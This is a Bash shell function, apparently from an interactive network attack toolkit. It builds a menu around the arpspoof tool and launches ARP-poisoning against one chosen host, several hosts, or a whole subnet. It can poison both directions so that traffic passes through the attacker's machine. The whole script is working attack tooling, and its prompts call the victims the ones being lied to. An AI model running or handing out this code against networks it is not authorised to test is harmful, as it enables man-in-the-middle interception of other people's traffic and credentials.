arpspoof--()
{

	mass_arp--()
	{
	if [[ $arp_way == "yes" ]];then
		while [[ "$1" != "" ]];do
			Eterm -b black -f white --pause --title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
			Eterm -b black -f white --pause --title "ARP to $gt_way (GW) as $1" -e arpspoof -i $spoof_dev -t $gt_way $1 &
			shift
		done

	else
		while [[ "$1" != "" ]];do
			Eterm -b black -f white --pause --title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
			shift
		done

	fi
	}

	arpspoof_II--()
	{
	clear

	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          --ARPspoof Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Spoofing NIC        [$out$spoof_dev$inp]

2) Gateway IP Address  [$out$gt_way$inp]

3) Target              [$out$tgt_style_II$inp]

4) List Available NICs

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) echo -e "$inp\nNIC?"
			read spoof_dev
			dev_check_var=$spoof_dev
			dev_check--
			if [[ $dev_check == "fail" ]];then
				spoof_dev=
			fi

			arpspoof_II--;;

		2) echo -e "$inp\nDefine Gateway IP Address (Who Are We Pretending to Be?)"
		read gt_way
		ip_mac-- ip $gt_way
		if [[ $ip_mac == "fail" ]];then
			gt_way=
		fi

		arpspoof_II--;;

		3) echo -e "$hdr\n~~~~~~~~~~~~~~~~~
--ArpSpoof Tgts--
~~~~~~~~~~~~~~~~~$inp
E)verybody
M)ultiple Tgts
S)ingle Tgt$hdr
~~~~~~~~~~~~~~~~~\n$inp"
		read tgt_style
		case $tgt_style in
			e|E) tgt_style_II="Everybody";;

			m|M) echo -e "$inp\nSeperate Tgts with a space (i.e. IP1 IP2 IP3)"
			read mult_tgts
			while [[ $var_II != "x" ]];do
				echo -e "$inp\nTwo Way Spoof? (y or n)"
				read _2way
				case $_2way in
					y|Y) var_II="x"
					arp_way="yes";;

					n|N) var_II="x";;

					*) var_II= ;;
				esac

			done

			tgt_style_II="Multiple Tgts";;

			s|S) echo -e "$inp\nDefine Target IP address (Who Are we Lying to?)"
			read tgt_ip
			ip_mac-- ip $tgt_ip
			if [[ $ip_mac == "fail" ]];then
				tgt_ip=
			fi

			if [[ -z $tgt_ip ]];then
				arpspoof_II
			else
				while [[ $var_III != "x" ]]; do
					echo -e "$inp\nTwo Way Spoof? (y or n)"
					read _2way
					case $_2way in
						y|Y|n|N) var_III="x";;

						*) var_III= ;;
					esac

				done

			tgt_style_II="Single Tgt"
			fi;;

			*) tgt_style_II= ;;
		esac

		arpspoof_II--;;

		4) nics--
		arpspoof_II--;;

		c|C) if [[ -z $spoof_dev || -z $gt_way || -z $tgt_style_II ]];then
			echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			arpspoof_II--
		else
			fcheck--
			case $tgt_style in
				e|E) Eterm -b black -f white --pause --title "ArpSpoof Subnet $gt_way (GW)" -e arpspoof -i $spoof_dev $gt_way &
				atk_menu--;;

				m|M) mass_arp-- $mult_tgts
				atk_menu--;;

				s|S) case $_2way in
					y|Y) Eterm -b black -f white --pause --title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
					Eterm -b black -f white --pause --title "ARP to $gt_way (GW) as $tgt_ip" -e arpspoof -i $spoof_dev -t $gt_way $tgt_ip & ;;

					n|N) Eterm -b black -f white --pause --title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way & ;;
				esac

				atk_menu--;;

			esac

		fi;;

		p|P) atk_menu--;;

		m|M) main_menu--;;

		*) arpspoof_II--;;
	esac
	}

var_II=
var_III=
spoof_dev=$ie ## Device to spoof with
gt_way=$(route -en | grep UG | awk '{print $2}' | head -n1) ## Gateway IP variable, defaulted to first gateway if available
tgt_ip= ## Tgt IP variable
mult_tgts= ## Variable to assign multiple IPs with
arp_way= ## Variable to define Two-Way spoofing with multiple IPs
tgt_style_II= ## Variable for showing who is being targeted, $tgt_style defines who is being targeted
arpspoof_II--
}
